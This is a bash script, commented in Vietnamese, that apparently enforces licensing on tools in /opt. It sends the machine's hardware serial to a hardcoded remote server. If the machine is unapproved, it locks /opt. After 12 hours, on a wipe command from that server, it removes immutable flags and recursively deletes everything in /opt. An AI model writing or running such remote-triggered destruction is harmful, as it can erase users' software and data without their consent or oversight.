#!/bin/bash

STATUS_FILE="/tmp/vps_status.txt"
FIRST_FAIL_FILE="/var/log/.vps_first_fail.timestamp"
SERIAL=$(sudo /usr/sbin/dmidecode -s system-serial-number 2>/dev/null)

# ĐIỀN IP VPS HIỆN TẠI CỦA BẠN VÀO ĐÂY (Sau này đổi VPS chỉ cần sửa duy nhất dòng này trên GitHub)
VPS_URL="http://13.214.142.47:8888"

TOOL_DIR_1="/opt"

if grep -q "You are not approved" "$STATUS_FILE" 2>/dev/null; then
    
    # ------------------ LOGIC ĐẾM GIỜ 12H ------------------
    SERVER_TIME=$(grep "SERVER_TIME:" "$STATUS_FILE" | awk -F 'SERVER_TIME:' '{print $2}' | tr -d '\r\n')

    if [ -n "$SERVER_TIME" ]; then
        if [ ! -f "$FIRST_FAIL_FILE" ]; then
            echo "$SERVER_TIME" > "$FIRST_FAIL_FILE"
            chmod 644 "$FIRST_FAIL_FILE"
        fi

        START_TIME=$(cat "$FIRST_FAIL_FILE" | tr -d '\r\n')
        ELAPSED=$((SERVER_TIME - START_TIME))

        # Đủ 12 tiếng (43200 giây) -> Bắn tin về VPS
        if [ "$ELAPSED" -ge 43200 ]; then
            # Mở lại quyền tạm thời để lệnh curl gửi đi thành công
            chmod -R 755 "$TOOL_DIR_1" 2>/dev/null

            # Gửi request kiểm tra lệnh Wipe từ VPS
            RESPONSE=$(curl -s --connect-timeout 5 "${VPS_URL}/report_12h?serial=${SERIAL}")

            # Nếu VPS ra lệnh Wipe -> Tiến hành tự hủy
            if [ "$RESPONSE" == "ACTION:WIPE_ALL_TOOLS" ]; then
                # 1. Gỡ bỏ thuộc tính khóa cứng (immutable)
                chattr -R -i "$TOOL_DIR_1"/* 2>/dev/null
                
                # 2. Phá khóa, cấp quyền ghi/xóa
                chown -R root:root "$TOOL_DIR_1" 2>/dev/null
                chmod -R 777 "$TOOL_DIR_1" 2>/dev/null

                # 3. Xóa sạch tận gốc cả thư mục eda lẫn file ẩn trong /opt
                rm -rf "$TOOL_DIR_1"/{*,.[!.]*,..?*} 2>/dev/null
                find "$TOOL_DIR_1" -mindepth 1 -delete 2>/dev/null
                
                rm -f "$FIRST_FAIL_FILE"
                exit 0
            fi
        fi
    fi

    # 🔒 KHÓA QUYỀN /OPT (Chỉ khóa nếu bị từ chối và chưa bị Wipe)
    [ -d "$TOOL_DIR_1" ] && chmod -R 000 "$TOOL_DIR_1" 2>/dev/null

else
    # 🔓 MỞ KHÓA: Nếu Serial hợp lệ (AUTHORIZED) -> Trả lại quyền bình thường
    [ -d "$TOOL_DIR_1" ] && chmod -R 755 "$TOOL_DIR_1" 2>/dev/null

    if [ -f "$FIRST_FAIL_FILE" ]; then
        rm -f "$FIRST_FAIL_FILE"
    fi
fi
